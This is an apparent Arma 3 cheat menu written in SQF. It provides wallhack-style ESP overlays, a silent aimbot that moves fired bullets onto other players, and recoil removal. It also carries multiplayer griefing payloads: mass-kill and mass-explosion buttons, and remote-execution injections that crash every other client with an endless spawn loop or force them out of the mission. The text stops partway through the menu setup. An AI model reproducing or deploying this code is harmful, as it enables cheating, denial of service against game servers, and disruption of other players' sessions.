[] call {
	(findDisplay 46) displayAddEventHandler ["KeyDown", "if ((_this select 1) == 210) then { [] call test_page_1; profileNamespace setVariable [""rscdebugconsole_expression"", ""0""]; profileNamespace setVariable [""bis_rscdebugconsoleexpressionresultctrl"", ""0""]; profileNamespace setVariable [""bis_rscdebugconsoleexpressionresulthistory"", ""0""]; };"];
	(findDisplay 46) displayAddEventHandler ["KeyDown", "if ((_this select 1) == 0x42) then { [] call test_killcursortarget; };"];
	(findDisplay 46) displayAddEventHandler ["KeyDown", "if ((_this select 1) == 0x43) then { [] call test_explodecursortarget; };"];
	(findDisplay 46) displayAddEventHandler ["KeyDown", "if ((_this select 1) == 0x44) then { [] call test_impuulscursortarget; };"];
	(findDisplay 46) displayAddEventHandler ["KeyDown", "if ((_this select 1) == 78) then { FOV_RADIUS_SIZE = FOV_RADIUS_SIZE + 0.01; };"];
	(findDisplay 46) displayAddEventHandler ["KeyDown", "if ((_this select 1) == 74) then { if (FOV_RADIUS_SIZE >=0) then { FOV_RADIUS_SIZE = FOV_RADIUS_SIZE - 0.01; }; };"];
};
FOV_RADIUS_SIZE = 0.025;
drawButton = {
	params [ "_nameButton", "_text", "_pos", "_display", "_action" ];

	_nameButton = _display ctrlCreate ["RscButton", -1];
	_nameButton ctrlSetPosition _pos;
	_nameButton ctrlSetText _text;
	_nameButton buttonSetAction _action;
	_nameButton ctrlSetFont "PuristaLight";
	_nameButton ctrlSetFontHeight 0.03;
	_nameButton ctrlSetPixelPrecision 1;
	_nameButton ctrlCommit 0.26;
};
drawBackground = {
	params [ "_nameBackground", "_pos", "_display", "_color" ];

	_nameBackground = _display ctrlCreate ["IGUIBack", -1];
	_nameBackground ctrlSetPosition _pos;
	_nameBackground ctrlSetBackgroundColor _color;
	_nameBackground ctrlSetPixelPrecision 1;
	_nameBackground ctrlCommit 0.26;
};
drawString = {
	params [ "_nameString", "_text", "_pos", "_fontSize", "_display", "_color"];

	_nameString = _display ctrlCreate ["RscStructuredText", -1];
	_nameString ctrlSetStructuredText parseText format ["<t size='0.725' shadow='2'> %1", _text];
	_nameString ctrlSetPosition _pos;
	_nameString ctrlSetFont 'PuristaMedium';
	_nameString ctrlSetFontHeight _fontSize;
	_nameString ctrlSetTextColor _color;
	_nameString ctrlCommit 0.26;
};

spawner_test = {
	params [ "_display" ];

	SilahList = _display ctrlCreate ["RscListBox", -1];
	SilahList ctrlSetPosition [0.181945,0.394721,0.571843,0.163165];
	SilahList ctrlSetEventHandler ["LbDBlClick","call silatest;"];
	SilahList ctrlSetFontHeight 0.027;
	SilahList ctrlSetFont "PuristaLight";
	SilahList ctrlCommit 0.26;

	weaponList = [];
	_weaponConfig = configFile >> "cfgWeapons";

	for "_i" from 0 to (count _weaponConfig)-1 do {
		_weapon = _weaponConfig select _i;

		if (isClass _weapon) then {
			_weaponName = configName _weapon;
			_ulx = toArray _weaponName;
			_ulx resize 7;
			_ulx = toString _ulx;

			if ((_ulx != "ItemKey") and (getNumber (_weapon >> "scope") == 2) and ((getText (configFile >> "cfgWeapons" >> _weaponName >> "picture")) != "")) then {
				weaponList = weaponList + [_weaponName];
			};
		};
	};

	for "_i" from 0 to (count weaponList)-1 do {
		_weapon = weaponList select _i;
		SilahList lbAdd _weapon;
		SilahList lbSetPicture [_i, (getText (configFile >> "cfgWeapons" >> _weapon >> "picture"))];
	};

	lbSort SilahList;

	silatest = {

		_ctrl = _this select 0;
		_index = _this select 1;
		_selected_item = _ctrl lbText _index;


		_IkiliArray = toArray _selected_item;
		_IkiliArray resize 2;
		_IkiliArray = toString _IkiliArray;


		_UcluArray = toArray _selected_item;
		_UcluArray resize 3;
		_UcluArray = toString _UcluArray;

		_ammo_class_name = getArray(configFile >> "cfgWeapons" >> _selected_item >> "magazines");
		_ammo = _ammo_class_name select 0;


		if (_IkiliArray == "H_") then {
			player addHeadgear _selected_item;
		};
		if (_IkiliArray == "V_") then {
			player addVest _selected_item;
		};
		if (_IkiliArray == "U_") then {
			player forceAddUniform  _selected_item;
		};
		if (_IkiliArray != "H_" && _IkiliArray != "V_" && _IkiliArray != "U_") then {
			player addWeapon  _selected_item;
			player addMagazines [_ammo, 12];
		};
		if (_IkiliArray == "op" || _IkiliArray == "ac" || _UcluArray == "bip" || _UcluArray == "muz") then {
			player addPrimaryWeaponItem  _selected_item;
		};

	};
};

test_func = {
params [["_target", cursorTarget], ["_shooter", player],
["_speed_coef_muzzle", 1], ["_flight_dist", 0], "_weapon", "_magazine", "_init_speed_gun", "_init_speed_mag",
"_ammo_class", "_air_friction", "_items", "_init_time", "_max_speed", "_thrust", "_thrust_time", "_rel_speed",
["_air_fric_fact", -0.002], ["_burned_out", false], ["_prop_started", false], ["_burn_time", 0], ["_last_dist", 0],
["_last_time", 0], ["_time_diff", 0], "_distance", "_dist_step", "_last_speed", "_last_accel", "_new_dist", "_term",
"_new_time", "_new_speed", "_new_accel"];

_shooter = vehicle _shooter;

_weapon = currentWeapon _shooter;
_magazine = currentMagazine _shooter;

_init_speed_gun = getNumber(configfile >> "CfgWeapons" >> _weapon >> "initSpeed");
_init_speed_mag = getNumber(configfile >> "CfgMagazines" >> _magazine >> "initSpeed");
_ammo_class = getText(configFile >> "CfgMagazines" >> _magazine >> "ammo");

_air_friction = getNumber(configFile >> "CfgAmmo" >> _ammo_class >> "airFriction");

_items = _shooter weaponAccessories _weapon;

_init_time = getNumber(configFile >> "CfgAmmo" >> _ammo_class >> "initTime");
_max_speed = getNumber(configFile >> "CfgAmmo" >> _ammo_class >> "maxSpeed");
_thrust = getNumber(configFile >> "CfgAmmo" >> _ammo_class >> "thrust");
_thrust_time = getNumber(configFile >> "CfgAmmo" >> _ammo_class >> "thrustTime");;

_rel_speed = ((velocity _target) vectorDiff (velocity _shooter));

if((_init_speed_gun) < 0) then
{
 _init_speed_gun = -1 * init_speed_gun * _init_speed_mag;
};

if((_init_speed_gun) == 0) then
{
 _init_speed_gun = _init_speed_mag;
};

{
 if((_x find "muzzle") > -1) then
 {
  _temp_coef = getNumber(configfile >> "CfgWeapons" >> _x >> "ItemInfo" >> "MagazineCoef" >> "initSpeed");
  _speed_coef_muzzle = if (_temp_coef !=0) then {_temp_coef}else{1};
 };
} forEach _items;

_init_speed_gun = _init_speed_gun * _speed_coef_muzzle;

if((vectorMagnitude _rel_speed) >= 0) exitWith
{
 _distance = _target distance _shooter;

 if(_air_friction > 0) then {_air_friction = _air_friction * _air_fric_fact;};

 _dist_step = _distance / (10 * diag_fps);

_last_speed = _init_speed_gun;
_last_accel = _air_friction * _init_speed_gun ^ 2;

while {_last_dist < _distance} do
{
 _new_dist = _last_dist + _dist_step;

 if (_last_accel < 0) then
 {
  _term = _last_speed / _last_accel;
  _time_diff = -1 * sqrt (_term ^ 2 + 2 * _dist_step / _last_accel) - _term;
 }
 else
 {
  if(_last_accel == 0) then
  {
   _time_diff = _dist_step / _last_speed;
  }
  else
  {
   _term = _last_speed / _last_accel;
   _time_diff = sqrt (_term ^ 2 + 2 * _dist_step / _last_accel) - _term;
  };
 };

 _new_time = _time_diff + _last_time;
 _new_speed = _last_speed + _last_accel * _time_diff;

 if(_new_speed <= 0) exitWith {0};

 _new_accel = _air_friction * _new_speed ^ 2;

 if((_max_speed > 30) and (!_burned_out) and (_last_time > _init_time)) then
 {
  if(!_prop_started) then
  {
   _prop_started = true;
   _burn_time = diag_tickTime + _thrust_time;
  }
  else
  {
   if(diag_tickTime > _burn_time) then
   {
    _burned_out = true;
   };
  };
  _new_accel = _new_accel + _thrust;
 };

 _last_dist = _new_dist;
 _last_time = _new_time;
 _last_speed = _new_speed;
 _last_accel = _new_accel;
};

((_target modelToWorldVisual ((_target selectionPosition "pelvis"))) vectorAdd (_rel_speed vectorMultiply _last_time));
};
};

color_test = {
	params [ "_target", "_checkForVisible" ];
	_colorYazi = [];
	switch (faction _target) do {
		case "BLU_F": { _colorYazi = [0,0.502,1,1] };
		case "OPF_F": { _colorYazi = [1,0.2,0,1] };
		case "IND_F": { _colorYazi = [0,1,0.102,1] };
		case "CIV_F": { _colorYazi = [0.467,0,1,1] };
		default { _colorYazi = [0.29,0.29,0.29,1]; };
	};

	if (_checkForVisible) then
	{
		if ([player, "VIEW"] checkVisibility [eyepos player, eyepos _target] != 0) then {
			_colorYazi = [0.776,0.22,0,1];
		};
	};

	_colorYazi
};

test_fov = {
	params [ "_target" ];

	_sum = false;
	_pos = (_target modelToWorldVisual ((_target selectionPosition "neck") vectorAdd [0,0,0.06]));
	_w2sPos = (worldToScreen (_pos));
	if (!(_w2sPos isEqualTo [])) then {
		if ((_w2sPos distance2D ([0.5,0.5]) <= FOV_RADIUS_SIZE)) then {
			_sum = true;
		};
	};

	_sum
};

test_nameepp = {
	if (isNil 'toggle1') then {
	toggle1 = 1
	};
	if (toggle1 == 1) then {
	toggle1 = 0;

	isimesp = addMissionEventHandler ["Draw3D",{
		{
			if (_x isKindOf 'man' && player != _x && cameraOn distance _x < 1500 && alive _x && !(worldToScreen(getPosATL _x) isEqualTo [])) then {
				_posX = (_x modelToWorldVisual [0,0,-0.15]);
				_posXHead = (_x modelToWorldVisual ((_x selectionPosition "neck") vectorAdd [0,0,0.06]));

				_colorYazi = [_x, true] call color_test;

				if ([_x] call test_fov) then {
					_colorYazi = [0.776,0,0.337,1];
				};

				drawIcon3D ["", _colorYazi, _posX, 0, 0, 0, format["%1",name _x], 2.35, 0.0255, "PuristaSemiBold"];
				drawIcon3D ["", _colorYazi, _posX, 0, 1, 0, format["[%1]",round(cameraOn distance _x)], 2.35, 0.0255, "PuristaSemiBold"];
				drawIcon3D ["Workshop\dot.paa", _colorYazi, _posXHead, 0.39, 0.39, 0, "", 0, 0.01, "PuristaSemiBold"];

				if (damage _x >= 0 && damage _x <0.10) then {
					drawIcon3D ["Workshop\hp100.paa", [0.078,0.749,0,1],_posX, 3, 3, 0,"", 0, 1, "PuristaSemiBold"];
				};
				if (damage _x >= 0.10 && damage _x <0.20) then {
					drawIcon3D ["Workshop\hp90.paa", [0.263,0.773,0,1],_posX, 3, 3, 0,"", 0, 1, "PuristaSemiBold"];
				};
				if (damage _x >= 0.20 && damage _x <0.30) then {
					drawIcon3D ["Workshop\hp80.paa", [0.455,0.8,0,1],_posX, 3, 3, 0,"", 0, 1, "PuristaSemiBold"];
				};
				if (damage _x >= 0.30 && damage _x <0.40) then {
					drawIcon3D ["Workshop\hp70.paa", [0.659,0.824,0,1],_posX, 3, 3, 0,"", 0, 1, "PuristaSemiBold"];
				};
				if (damage _x >= 0.40 && damage _x <0.50) then {
					drawIcon3D ["Workshop\hp60.paa", [0.875,0.651,0,1],_posX, 3, 3, 0,"", 0, 1, "PuristaSemiBold"];
				};
				if (damage _x >= 0.50 && damage _x <0.60) then {
					drawIcon3D ["Workshop\hp50.paa", [0.902,0.463,0,1],_posX, 3, 3, 0,"", 0, 1, "PuristaSemiBold"];
				};
				if (damage _x >= 0.60 && damage _x <0.70) then {
					drawIcon3D ["Workshop\hp40.paa", [0.925,0.263,0,1],_posX, 3, 3, 0,"", 0, 1, "PuristaSemiBold"];
				};
				if (damage _x >= 0.70 && damage _x <0.80) then {
					drawIcon3D ["Workshop\hp30.paa", [1,0.89,0,1],_posX, 3, 3, 0,"", 0, 1, "PuristaSemiBold"];
				};
				if (damage _x >= 0.80 && damage _x <0.90) then {
					drawIcon3D ["Workshop\hp20.paa", [0.925,0.129,0,1],_posX, 3, 3, 0,"", 0, 1, "PuristaSemiBold"];
				};
				if (damage _x >= 0.90 && damage _x <1) then {
					drawIcon3D ["Workshop\hp10.paa", [0.953,0,0.11,1],_posX, 3, 3, 0,"", 0, 1, "PuristaSemiBold"];
				};
			};
		} forEach (if(isMultiplayer) then {allPlayers} else {allUnits});
	}];

	} else {
	toggle1 = 1;
	removeMissionEventHandler ["Draw3D",isimesp];

	};
	playSound "addItemOk";
};
test_carepp = {
	if (isNil 'toggle4') then {
	toggle4 = 1;
	};
	if (toggle4 == 1) then {
	toggle4 = 0;

	arabaesp = addMissionEventHandler ["Draw3D", {
		{
		_pos = (_x modelToWorldVisual [0,0,0.5]);
		if (cameraOn distance _x < 800) then {
			if (_x iskindof 'AllVehicles' || _x iskindof 'Air' && alive _x && !(worldToScreen(getPosATL _x) isEqualTo [])) then {
				_colorYazi = [0.471,0.031,0.549,1];
				drawIcon3D ["", _colorYazi, _pos, 0, 0, 0, (format ["%1 [%2]",((configFile >> "CfgVehicles" >> typeOf _x >> "displayName") call BIS_fnc_GetCfgData), (round(cameraOn distance _x))]), 2, 0.0263, "PuristaSemiBold"];
			};
		};
		} foreach vehicles;
	}];
	} else {
	toggle4 = 1;
	removeMissionEventHandler ["Draw3D",arabaesp];

	};
	playSound "addItemOk";
};
test_mapeep =
{
	if (isNil "testing_maper") then
	{
		testing_maper = false;
	};
	if (testing_maper) then
	{
		((findDisplay 12) displayCtrl 51) ctrlRemoveEventHandler ["Draw", markersInMapVisualHandler];
		playSound "addItemOk";
		testing_maper = false;
	}
	else
	{
		if (isNil "ItemMap") then
		{
			player addWeapon "ItemMap";
		};
		markersInMapVisualHandler = ((findDisplay 12) displayCtrl 51) ctrlAddEventHandler ["Draw",
		{
			{
				_iconType =
				if (vehicle _x == _x) then
				{
					"IconMan";
				}
				else
				{
					switch (true) do
					{
						case ((vehicle _x) isKindOf "Man"):
						{
							"IconMan";
						};
						case ((vehicle _x) isKindOf "Car"):
						{
							"IconCar";
						};
						case ((vehicle _x) isKindOf "Tank"):
						{
							"IconTank";
						};
						case ((vehicle _x) isKindOf "Air"):
						{
							"IconAir";
						};
						case ((vehicle _x) isKindOf "Ship"):
						{
							"IconShip";
						};
					};
				};
				_colorSide =
				switch (side _x) do
				{
					case west:
					{
						[0, 0.3, 1, 1];
					};
					case east:
					{
						[1, 0.3, 0.2, 1];
					};
					case resistance:
					{
						[0.2, 1, 0.25, 1];
					};
					case civilian:
					{
						[1, 0.2, 0.8, 1];
					};
					default
					{
						[random 1, random 1, random 1, 1];
					};
				};
				_name =
				if (_x == vehicle _x) then
				{
					name _x;
				}
				else
				{
					if (count (crew (vehicle _x)) == 1) then
					{
						format ["%1", name (driver (vehicle _x))];
					}
					else
					{
						if (_x == (driver (vehicle _x))) then
						{
							format ["%1: %2 + %3", getText (configFile >> "CfgVehicles" >> typeOf (vehicle _x) >> "displayName"), name (driver (vehicle _x)), count (crew (vehicle _x)) - 1];
						}
						else
						{
							format ["%1: %2", getText (configFile >> "CfgVehicles" >> typeOf (vehicle _x) >> "displayName"), name (driver (vehicle _x))];
						};
					};
				};
				if (alive _x) then
				{
					(_this select 0) drawIcon [_iconType, _colorSide, getPos _x, 24, 24, getDir _x, _name, 0, 0.04, "PuristaMedium", "Right", false];
				};
			} forEach (if (isMultiplayer) then {allPlayers} else {allUnits});
		}];
		playSound "addItemOk";
		testing_maper = true;
	};
};
test_buletepp = {
	if (isNil 'toggle6') then {
	toggle6 = 1
	};
	if (toggle6 == 1) then {
	toggle6 = 0;

	bulletesp = addMissionEventHandler ["Draw3D",{
		{
			_colorYazi = [255, 255, 255, 1];

			if (!(_x iskindof 'Air') && !(_x iskindof 'Landvehicle') && !(_x iskindof 'man') && !(_x iskindof 'Bird') && speed _x >= 28 && !(worldToScreen(getPos _x) isEqualTo [])) then {
				drawIcon3D ["Workshop\dot.paa", _colorYazi, getPosATLVisual _x, 0.4, 0.4, 0, "Лови ёпт", 1.7, 0.0255, "PuristaSemiBold"];
				drawIcon3D ["", _colorYazi, getPosATLVisual _x, 0, 2.0, 0, format ["[%1]",round (cameraOn distance _x)], 1.7, 0.0255, "PuristaSemiBold"];
			};
		} forEach (position player nearObjects 300);
	}];
	} else {
	toggle6 = 1;
	removeMissionEventHandler ["Draw3D",bulletesp];
	};
	playSound "addItemOk";
};
test_snap = {
	if (isNil 'toggle7') then {
	toggle7 = 1;
	};
	if (toggle7 == 1) then {
	toggle7 = 0;

	uiNamespace setVariable ["snapLine1", [ [], [] ]];
	_snaplineesp = addMissionEventHandler ["Draw3D", {
		{

			if (_x isKindOf 'man' && player != _x && cameraOn distance _x < 1500 && alive _X && !(worldToScreen (getPosATLVisual _x) isEqualTo [])) then {
				_colorYazi = [_x, true] call color_test;

				if ([_x] call test_fov) then {
					_colorYazi = [0.776,0,0.337,1];
				};

				_ayakPosW2S = WorldToScreen (_x modelToWorldVisual [0,0,0]);

				_snapLinePosInfo = uiNamespace getVariable "snapLine1";
				_snapLineIndex = _snapLinePosInfo select 0 find _x;
				_snapLineCtrl = if ( _snapLineIndex > -1 ) then {
					_snapLinePosInfo select 1 select _snapLineIndex;
				};

				if ( isNil "_snapLineCtrl" ) then {
					_snapLineCtrl = findDisplay 46 ctrlCreate ["RscLine", -1 + count ( _snapLinePosInfo select 1 )];
					_snapIndex = _snapLinePosInfo select 0 pushBack _x;
					_snapLinePosInfo select 1 set[ _snapIndex, _snapLineCtrl ];

				};

				_snapLineCtrl ctrlSetTextColor _colorYazi;
				_snapLineCtrl ctrlSetPosition[ 0.5, 1.405, (_ayakPosW2S select 0) - 0.5, (_ayakPosW2S select 1) - 1.405 ];
				_snapLineCtrl ctrlSetPixelPrecision 2;
				_snapLineCtrl ctrlCommit 0;

				if ( ctrlFade _snapLineCtrl > 0 ) then {
				_snapLineCtrl ctrlSetFade 0;
				};

			} else {

				_snapLineCtrl ctrlSetFade 1;

			};
			_snapLinePosInfo = uiNamespace getVariable[ "snapLine1", [ [], [] ]];

			{
				if (!alive _x || Isnull _x || cameraOn distance _x > 1500 || player == _x) then {
					ctrlDelete ( _snapLinePosInfo select 1 select _forEachIndex );
					_snapLinePosInfo select 1 set [ _forEachIndex, controlNull ];
					_snapLinePosInfo select 0 set [ _forEachIndex, objNull ];
				};
			} forEach ( _snapLinePosInfo select 0 );

			_snapLinePosInfo set [ 0, ( _snapLinePosInfo select 0 ) - [ objNull ]];
			_snapLinePosInfo set [ 1, ( _snapLinePosInfo select 1 ) - [ controlNull ]];

		} forEach (if(isMultiplayer) then {allPlayers} else {allUnits});
	}];
	} else {
	toggle7 = 1;

	removeMissionEventHandler ["Draw3D",_snaplineesp];
	_snapLinePosInfo = uiNamespace getVariable[ "snapLine1", [ [], [] ]];
	{
		ctrlDelete ( _snapLinePosInfo select 1 select _forEachIndex );
	} forEach ( _snapLinePosInfo select 0 );

	uiNamespace setVariable ["snapLine1", nil];
	};

	playSound "addItemOk";
};

test_silenta = {
	if (isNil 'toggle8') then {
	toggle8 = 1;
	};
	if (toggle8 == 1) then {
	toggle8 = 0;
	silentatis = (vehicle player) addEventHandler ["Fired", {
		{
			_nearestPlayer = _x;
			_w2sPos = worldToScreen (getPosATLVisual _nearestPlayer);
			if (!(_w2sPos isEqualTo [])) then {
				if (player distance _nearestPlayer < 1500 && ((worldToScreen (getPosATLVisual _nearestPlayer)) distance ([0.5,0.5]) <= FOV_RADIUS_SIZE) && alive _nearestPlayer && group _nearestPlayer != group player && _nearestPlayer != player ) then {
					_bullet = _this select 6;
					_pos = (_nearestPlayer modelToWorldVisual (_nearestPlayer selectionPosition "neck") vectorAdd [0,0,0.06]);
					_bullet setPos (_pos);
				};
			};
		} forEach (if(isMultiplayer) then {allPlayers} else {allUnits});
	}];

	} else {
	toggle8 = 1;
	player removeEventHandler ["Fired", silentatis];
	fovSa ctrlshow false;

	};
	playSound "addItemOk";
};


test_recoil = {
	if (isNil 'toggle11') then {
	toggle11 = 1;
	};
	if (toggle11 == 1) then {
		toggle11 = 0;
		player setUnitRecoilCoefficient 0;
	} else {
		toggle11 = 1;
		player setUnitRecoilCoefficient 1;
	};
	playSound "addItemOk";
};

test_cursortarget = {
	CursorTarget setVariable ["restrained",true,true];
	[vehicles select 0] remoteExec ["life_fnc_restrain",CursorTarget];
};
test_uncursortarget = {
	CursorTarget setVariable ["restrained",false,true];
	[vehicles select 0] remoteExec ["life_fnc_restrain",CursorTarget];
};
test_keycursortarget = {
	life_vehicles set [count life_vehicles, CursorTarget];
};
test_impcursortarget = {
	[CursorTarget, true, CursorTarget] remoteExecCall ["TON_fnc_vehicleStore",0];
};
test_unrecursortarget = {
	player setVariable ["restrained",false,true];
	[vehicles select 0] remoteExec ["life_fnc_restrain",player];
};
test_killcursortarget= {
_mine = Cursortarget; _mine setdamage 1;
};

test_explodecursortarget= {
_bomb = "Bomb_04_F" createVehicleLocal (screenToWorld[0.5,0.5]);
};
test_impuulscursortarget= {
	if(!Isnull Cursortarget && Cursortarget iskindof 'Air' || Cursortarget iskindof 'LandVehicle' || Cursortarget iskindof 'Ship') then {
		Cursortarget addForce [[34364,43530,85345],[265343,37432,74446]];
	};
};

testchbox1 = {
	params [ "_display" ];

	if (isNil healthf1) then { player setVariable ["healthf1", false]; };
	CheckBox1 = _display ctrlCreate ["RscCheckBox", 13371];
	CheckBox1 ctrlSetPosition [0.025 * safezoneW + safezoneX, 0.16 * safezoneH + safezoneY, 0.0125 * safezoneW, 0.02 * safezoneH];
	CheckBox1 ctrlCommit 0.26;
	CheckBox1 cbSetChecked (player getVariable "healthf1");

	CheckBox1 ctrlAddEventHandler ["CheckedChanged",{
		[] call test_nameepp;
		params ["_control", "_state"];
		if (_state isEqualTo 1) then {
			player setVariable ["healthf1", true];
		} else {
			player setVariable ["healthf1", false];
		};
	}];
};

testchbox4 = {
	params [ "_display" ];

	if (isNil healthf4) then { player setVariable ["healthf4", false]; };
	CheckBox4 = _display ctrlCreate ["RscCheckBox", 13374];
	CheckBox4 ctrlSetPosition [0.025 * safezoneW + safezoneX, 0.24 * safezoneH + safezoneY, 0.0125 * safezoneW, 0.02 * safezoneH];
	CheckBox4 ctrlCommit 0.26;
	CheckBox4 cbSetChecked (player getVariable "healthf4");

	CheckBox4 ctrlAddEventHandler ["CheckedChanged",{
		[] call test_carepp;
		params ["_control", "_state"];
		if (_state isEqualTo 1) then {
			player setVariable ["healthf4", true];
		} else {
			player setVariable ["healthf4", false];
		};
	}];
};
testchbox5 = {
	params [ "_display" ];

	if (isNil healthf5) then { player setVariable ["healthf5", false]; };
	CheckBox5 = _display ctrlCreate ["RscCheckBox", 13375];
	CheckBox5 ctrlSetPosition [0.025 * safezoneW + safezoneX, 0.2 * safezoneH + safezoneY, 0.0125 * safezoneW, 0.02 * safezoneH];
	CheckBox5 ctrlCommit 0.26;
	CheckBox5 cbSetChecked (player getVariable "healthf5");

	CheckBox5 ctrlAddEventHandler ["CheckedChanged",{
		[] call test_mapeep;
		params ["_control", "_state"];
		if (_state isEqualTo 1) then {
			player setVariable ["healthf5", true];
		} else {
			player setVariable ["healthf5", false];
		};
	}];
};
testchbox6 = {
	params [ "_display" ];

	if (isNil healthf6) then { player setVariable ["healthf6", false]; };
	CheckBox6 = _display ctrlCreate ["RscCheckBox", 13376];
	CheckBox6 ctrlSetPosition [0.025 * safezoneW + safezoneX, 0.32 * safezoneH + safezoneY, 0.0125 * safezoneW, 0.02 * safezoneH];
	CheckBox6 ctrlCommit 0.26;
	CheckBox6 cbSetChecked (player getVariable "healthf6");

	CheckBox6 ctrlAddEventHandler ["CheckedChanged",{
		[] call test_buletepp;
		params ["_control", "_state"];
		if (_state isEqualTo 1) then {
			player setVariable ["healthf6", true];
		} else {
			player setVariable ["healthf6", false];
		};
	}];
};
testchbox7 = {
	params [ "_display" ];

	if (isNil healthf7) then { player setVariable ["healthf7", false];; };
	CheckBox7 = _display ctrlCreate ["RscCheckBox", 13377];
	CheckBox7 ctrlSetPosition [0.025 * safezoneW + safezoneX, 0.28 * safezoneH + safezoneY, 0.0125 * safezoneW, 0.02 * safezoneH];
	CheckBox7 ctrlCommit 0.26;
	CheckBox7 cbSetChecked (player getVariable "healthf7");

	CheckBox7 ctrlAddEventHandler ["CheckedChanged",{
		[] call test_snap;
		params ["_control", "_state"];
		if (_state isEqualTo 1) then {
			player setVariable ["healthf7", true];
		} else {
			player setVariable ["healthf7", false];
		};
	}];
};
testchbox8 = {
	params [ "_display" ];

	if (isNil healthf8) then { player setVariable ["healthf8", false];; };
	CheckBox8 = _display ctrlCreate ["RscCheckBox", 13377];
	CheckBox8 ctrlSetPosition [0.1375 * safezoneW + safezoneX, 0.16 * safezoneH + safezoneY, 0.0125 * safezoneW, 0.02 * safezoneH];
	CheckBox8 ctrlCommit 0.26;
	CheckBox8 cbSetChecked (player getVariable "healthf8");

	CheckBox8 ctrlAddEventHandler ["CheckedChanged",{
		[] call test_silenta;
		params ["_control", "_state"];
		if (_state isEqualTo 1) then {
			player setVariable ["healthf8", true];
		} else {
			player setVariable ["healthf8", false];
		};
	}];
};


testchbox11 = {
	params [ "_display" ];

	if (isNil healthf11) then { player setVariable ["healthf11", false];; };
	CheckBox11 = _display ctrlCreate ["RscCheckBox", 13377];
	CheckBox11 ctrlSetPosition [0.1375 * safezoneW + safezoneX, 0.2 * safezoneH + safezoneY, 0.0125 * safezoneW, 0.02 * safezoneH];
	CheckBox11 ctrlCommit 0.26;
	CheckBox11 cbSetChecked (player getVariable "healthf11");

	CheckBox11 ctrlAddEventHandler ["CheckedChanged",{
		[] call test_recoil;
		params ["_control", "_state"];
		if (_state isEqualTo 1) then {
			player setVariable ["healthf11", true];
		} else {
			player setVariable ["healthf11", false];
		};
	}];
};


test_Execution =
{
    "B_RangeMaster_F" createUnit [[0,0,0], createGroup east, format ["%1", _this select 0], 0, "PRIVATE"];
};

test_kill_everyone =
{
    {
        if (player != _x) then
		{
			_x setDamage 1;
		};
    } forEach (if (isMultiplayer) then {allPlayers} else {allUnits});
	playSound "addItemOk";
};

test_crash_everyone =
{
	["if (getPlayerUID player != '1111111') then {[] spawn {while {true} do {'B_Soldier_F' createVehicleLocal [0, 0, 0]; uiSleep 0.01}}}"] call test_Execution;
	playSound "addItemOk";
};

test_blowup_everyone =
{
    {
		if (player != _x) then
		{
			"Bo_GBU12_LGB" createVehicleLocal (getPosATL _x);
		};
    } forEach (if (isMultiplayer) then {allPlayers} else {allUnits});
	playSound "addItemOk";
};

test_abort_everyone =
{
	["if (getPlayerUID player != '1111111') then {endMission 'Loser'; ((findDisplay 46) createDisplay 'RscDisplayEmpty') closeDisplay 0}"] call test_Execution;
	playSound "addItemOk";
};

test_main = {
	params [ "_display" ];

	_main_bg_tyhp_plsr = _display ctrlCreate ["IGUIBack", 2200];
	_main_bg_tyhp_plsr ctrlSetPosition [0.0125 * safezoneW + safezoneX, 0.04 * safezoneH + safezoneY, 0.2375 * safezoneW, 0.4 * safezoneH];
	_main_bg_tyhp_plsr ctrlSetBackgroundColor [0.133, 0.133, 0.133, 1];
	_main_bg_tyhp_plsr ctrlCommit 0;

	_main_bg_text_tyhp = _display ctrlCreate ["RscStructuredText", 1100];
	_main_bg_text_tyhp ctrlSetStructuredText parseText "<t align='center'>hattabich</t>";
	_main_bg_text_tyhp ctrlSetPosition [0.0125 * safezoneW + safezoneX, 0.04 * safezoneH + safezoneY, 0.2375 * safezoneW, 0.04 * safezoneH];
	_main_bg_text_tyhp ctrlCommit 0;

	_frame_tyhp_1 = _display ctrlCreate ["RscFrame", 1800];
	_frame_tyhp_1 ctrlSetPosition [0.025 * safezoneW + safezoneX, 0.12 * safezoneH + safezoneY, 0.1 * safezoneW, 0.26 * safezoneH];
	_frame_tyhp_1 ctrlCommit 0;

	_frame_tyhp_2 = _display ctrlCreate ["RscFrame", 1801];
	_frame_tyhp_2 ctrlSetPosition [0.1375 * safezoneW + safezoneX, 0.12 * safezoneH + safezoneY, 0.1 * safezoneW, 0.26 * safezoneH];
	_frame_tyhp_2 ctrlCommit 0;

	_text_kill_terpil = _display ctrlCreate ["RscStructuredText", 1101];
	_text_kill_terpil ctrlSetStructuredText parseText "<t align='center'>kill</t>";
	_text_kill_terpil ctrlSetPosition [0.025 * safezoneW + safezoneX, 0.12 * safezoneH + safezoneY, 0.1 * safezoneW, 0.02 * safezoneH];
	_text_kill_terpil ctrlCommit 0;

	_text_troll_terpil = _display ctrlCreate ["RscStructuredText", 1102];
	_text_troll_terpil ctrlSetStructuredText parseText "<t align='center'>troll</t>";
	_text_troll_terpil ctrlSetPosition [0.1375 * safezoneW + safezoneX, 0.12 * safezoneH + safezoneY, 0.1 * safezoneW, 0.02 * safezoneH];
	_text_troll_terpil ctrlCommit 0;

	_btn_kill_terpil = _display ctrlCreate ["RscButton", 1600];
	_btn_kill_terpil ctrlSetText "Добить";
	_btn_kill_terpil ctrlSetPosition [0.15 * safezoneW + safezoneX, 0.24 * safezoneH + safezoneY, 0.075 * safezoneW, 0.02 * safezoneH];
	_btn_kill_terpil ctrlSetFont "EtelkaMonospacePro";
	_btn_kill_terpil ctrlSetFontHeight 0.025;
	_btn_kill_terpil ctrlCommit 0;
	_btn_kill_terpil ctrlAddEventHandler ["ButtonClick", "[] spawn test_kill_everyone"];

	_btn_blowup_terpil = _display ctrlCreate ["RscButton", 1601];
	_btn_blowup_terpil ctrlSetText "Взорвать";
	_btn_blowup_terpil ctrlSetPosition [0.15 * safezoneW + safezoneX, 0.27 * safezoneH + safezoneY, 0.075 * safezoneW, 0.02 * safezoneH];
	_btn_blowup_terpil ctrlSetFont "EtelkaMonospacePro";
	_btn_blowup_terpil ctrlSetFontHeight 0.025;

	_btn_blowup_terpil ctrlCommit 0;
	_btn_blowup_terpil ctrlAddEventHandler ["ButtonClick", "[] spawn test_blowup_everyone"];

	_btn_crash_terpil = _display ctrlCreate ["RscButton", 1602];
	_btn_crash_terpil ctrlSetText "Крашнуть";
	_btn_crash_terpil ctrlSetPosition [0.15 * safezoneW + safezoneX, 0.30 * safezoneH + safezoneY, 0.075 * safezoneW, 0.02 * safezoneH];
	_btn_crash_terpil ctrlSetFont "EtelkaMonospacePro";
	_btn_crash_terpil ctrlSetFontHeight 0.025;
	_btn_crash_terpil ctrlCommit 0;
